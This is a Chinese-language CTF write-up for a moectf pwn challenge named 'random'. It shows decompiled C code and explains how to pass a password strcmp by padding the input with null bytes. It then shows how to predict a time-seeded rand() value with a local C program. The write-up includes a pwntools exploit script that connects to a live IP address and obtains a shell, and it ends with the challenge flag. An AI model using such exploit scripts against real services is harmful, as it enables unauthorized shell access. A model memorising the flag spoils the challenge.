# random

这题我是靠手速做出来的。

```c
undefined8 Main(void)
{
  int iVar1;
  uint uVar2;
  uint uVar3;
  uint uVar4;
  long in_FS_OFFSET;
  int local_70;
  int local_6c;
  undefined local_68 [32];
  time_t local_48;
  char acStack64 [32];
  long local_20;
  local_20 = *(long *)(in_FS_OFFSET + 0x28);
  setvbuf(stdin,(char *)0x0,2,0);
  setvbuf(stdout,(char *)0x0,2,0);
  setvbuf(stderr,(char *)0x0,2,0);
  local_48 = time((time_t *)0x0);
  memset(local_68,0,0x20);
  memset(acStack64,0,0x20);
  printf("username: ");
  read(0,local_68,0x20);
  printf("password: ");
  read(0,acStack64,0x20);
  iVar1 = strcmp(acStack64,"ls_4nyth1n9_7ruIy_R4nd0m?");
  if (iVar1 == 0) {
    printf("Hello, %s\n",local_68);
    puts("Let\'s guest number!");
    srand((uint)local_48);
    uVar2 = rand();
    uVar3 = rand();
    uVar4 = rand();
    srand(uVar4 ^ uVar2 ^ uVar3);
    rand();
    rand();
    rand();
    local_6c = rand();
    puts("I\'ve got a number in mind.");
    puts("If you guess it right, I\'ll give what you want.");
    puts("But remember, you have only one chance.");
    puts("Please tell me the number you guess now.");
    __isoc99_scanf(&DAT_00400cd9,&local_70);
    if (local_70 == local_6c) {
      puts("You did it!");
      puts("Here\'s your shell");
      system("/bin/sh");
    }
    else {
      puts("Emmm, seems you\'re wrong.");
      puts("Goodbye!");
    }
  }
  else {
    puts("Permission denied.");
  }
  if (local_20 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return 0;
}
```

又到了喜闻乐见rand函数时间。首先需要知道的知识点是，c语言里的rand函数是伪随机。srand用于播种生成随机数的种子，如果播种的种子相同那么出来的随机数也是相同的。记住这点我们就可以正式开始分析了。

先看第一个if语句，iVar1 = strcmp(acStack64,"ls_4nyth1n9_7ruIy_R4nd0m?");要求acStack64（我们输入的密码）和ls_4nyth1n9_7ruIy_R4nd0m?相同。有意思的事情来了，nc上目标后直接输入ls_4nyth1n9_7ruIy_R4nd0m?是无法通过这个if语句的。我还怀疑是不是大小端的关系，按4字节，8字节等对字符串作了变形，还是不行。暴躁的我直接不看了，扔下一句“什么玩意”就去做别的题了。

直到今天我实在不会别的题了，又仔细看了看程序。同时题目增加了提示。

- Border?

Border也是一道题，不过当时我直接做出来了就没写。那道题关键点是利用puts函数以\x00作为截断输出字符串的特点。同时那道题告诉了我们一个事实：c语言中，世界的尽头是\x00。这点有什么用呢？仔细看程序中接收输入的代码。

```c
read(0,acStack64,0x20);
```

接收0x20这么长的内容作为我们输入的密码。等一下，你确定ls_4nyth1n9_7ruIy_R4nd0m?有0x20这么长？明显是没有的。如果使用pwntools的sendline函数，就会在payload的末尾补上一个\n。这就是怎么输入都不对的原因了。正是因为ls_4nyth1n9_7ruIy_R4nd0m?没有0x20这么长，\n会被接收到输入的密码中，因此无论怎样都无法通过if语句。正确的做法是拿\x00填补不够长的内容，然后再用sendline（不知道直接send行吗，没试过）。

成功通过第一个if语句。接下来才是重头戏——猜随机数。之前提到只要种子一样生成的随机数也是一样的，因此我们可以先辨别出程序中使用了什么作为种子，然后自己写个c文件同步运行相同种子，最后将输出作为我们的答案。

srand((uint)local_48);说明local_48是种子。local_48 = time((time_t *)0x0);这句代码说明local_48以当前时间作为种子。别忘了ghidra和ida里都是伪代码，0x0也可以表示NULL，在写自己的脚本时需要稍微变动一下，我是参照[这里](https://www.bilibili.com/read/cv9244042/)的。

新建s.c文件，输入如下代码。

```c
#include <stdio.h>
#include <stdlib.h>
#include <time.h>
#include <string.h>
int main(void)
{
    srand((unsigned)time(NULL));
    int uVar2 = rand();
    int uVar3 = rand();
    int uVar4 = rand();
    srand(uVar4 ^ uVar2 ^ uVar3);
    rand();
    rand();
    rand();
    int local_6c = rand();
    printf("%d",local_6c);
}
```

有些头文件没用上，是之前的。我懒得删了，无伤大雅。然后gcc编译s.c文件为可执行文件s.o。

- gcc s.c -o s.o

建议用linux环境，我本机由于不是linux环境导致编译后随机数结果竟然不一样。最后就是exp了。

```python
from pwn import *
p=remote("43.136.137.17",3911)
password=b'ls_4nyth1n9_7ruIy_R4nd0m?'.ljust(0x20,b'\x00')
p.sendlineafter("username:",'a')
p.sendlineafter("password:",password)
proc=process("./s.o")
number=proc.recv()
p.sendlineafter("Please tell me the number you guess now.",number)
p.interactive()
```

这个脚本在我的linux shell运行不了remote语句，在本机运行不了./s.o，因为编译成了linux elf文件。我思考片刻，决定一展手速：先在linux shell上敲好./s.o的命令，本机运行删除process那行的脚本替换成input语句，运行的那一刻迅速回到shell运行s.o。试了两次成功了。


- ### Flag
  > moectf{9od_doe5_n0t_pl4y_dic3}